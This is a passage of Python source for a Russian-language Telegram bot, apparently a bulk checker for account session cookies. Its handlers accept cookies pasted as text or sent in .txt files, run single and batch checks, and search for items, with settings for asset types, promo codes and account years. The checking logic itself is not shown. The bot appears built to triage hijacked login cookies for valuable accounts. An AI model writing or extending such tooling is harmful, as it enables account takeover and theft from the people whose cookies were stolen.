@dp.message(Command("settings"))
async def cmd_settings(message: Message):
    if not is_admin(message): return
    await message.answer("⚙️ <b>Настройки</b>", reply_markup=settings_kb())


@dp.message(Command("search"))
async def cmd_search(message: Message, state: FSMContext):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        await message.answer("🔍 Введи название предмета:")
        await state.set_state(SearchState.waiting_for_term)
        return
    term = parts[1].strip()
    await state.update_data(search_term=term)
    await message.answer(
        "🔍 Ищем «<b>{}</b>»\n\nОтправь куки текстом или .txt файлом:".format(term)
    )
    await state.set_state(SearchState.waiting_for_cookie)


@dp.message(SearchState.waiting_for_term)
async def search_got_term(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    term = message.text.strip()
    if not term:
        await message.answer("❌ Введи название.")
        return
    await state.update_data(search_term=term)
    await message.answer(
        "🔍 Ищем «<b>{}</b>»\n\nОтправь куки текстом или .txt файлом:".format(term)
    )
    await state.set_state(SearchState.waiting_for_cookie)


@dp.message(SearchState.waiting_for_cookie, F.document)
async def search_got_file(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    data    = await state.get_data()
    term    = data.get("search_term", "")
    doc     = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл"); return
    file    = await bot.get_file(doc.file_id)
    buf     = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    cookies = extract_cookies(buf.read().decode("utf-8", errors="ignore"))
    await state.clear()
    await do_search(message, cookies, term)


@dp.message(SearchState.waiting_for_cookie, F.text)
async def search_got_text(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    data    = await state.get_data()
    term    = data.get("search_term", "")
    cookies = extract_cookies(message.text)
    await state.clear()
    await do_search(message, cookies, term)


@dp.callback_query(F.data.startswith("tog_"))
async def cb_toggle(cb: CallbackQuery):
    if not is_admin(cb): return await cb.answer("⛔")
    key = cb.data.replace("tog_", "")
    if key == "promo":
        settings["check_promo"] = not settings["check_promo"]
    elif key in settings["asset_types"]:
        settings["asset_types"][key] = not settings["asset_types"][key]
    await cb.message.edit_reply_markup(reply_markup=settings_kb())
    await cb.answer("✅")


@dp.callback_query(F.data == "set_yf")
async def cb_yf(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Начальный год (сейчас {}):".format(settings["year_from"]))
    await state.set_state(SetYear.from_year)
    await cb.answer()


@dp.callback_query(F.data == "set_yt")
async def cb_yt(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Конечный год (сейчас {}):".format(settings["year_to"]))
    await state.set_state(SetYear.to_year)
    await cb.answer()


@dp.message(SetYear.from_year)
async def save_yf(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    try:
        y = int(message.text.strip())
        assert 2006 <= y <= 2030
        settings["year_from"] = y
        await message.answer("✅ Начальный год: <b>{}</b>".format(y))
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")


@dp.message(SetYear.to_year)
async def save_yt(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    try:
        y = int(message.text.strip())
        assert 2006 <= y <= 2030
        settings["year_to"] = y
        await message.answer("✅ Конечный год: <b>{}</b>".format(y))
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")


@dp.message(F.document)
async def handle_file(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    doc = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл"); return
    file = await bot.get_file(doc.file_id)
    buf  = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    cookies = extract_cookies(buf.read().decode("utf-8", errors="ignore"))
    if not cookies:
        await message.answer("❌ Не нашёл куков в файле"); return
    await message.answer("📂 Найдено <b>{}</b> куков.".format(len(cookies)))
    if len(cookies) == 1:
        await run_check(message, cookies[0])
    else:
        await run_batch(message, cookies)


@dp.message(F.text)
async def handle_text(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    cookies = extract_cookies(message.text)
    if not cookies:
        await message.answer("ℹ️ Отправь cookie или .txt файл\n/settings")
        return
    if len(cookies) == 1:
        await run_check(message, cookies[0])
    else:
        await run_batch(message, cookies)


# ================================================================
async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
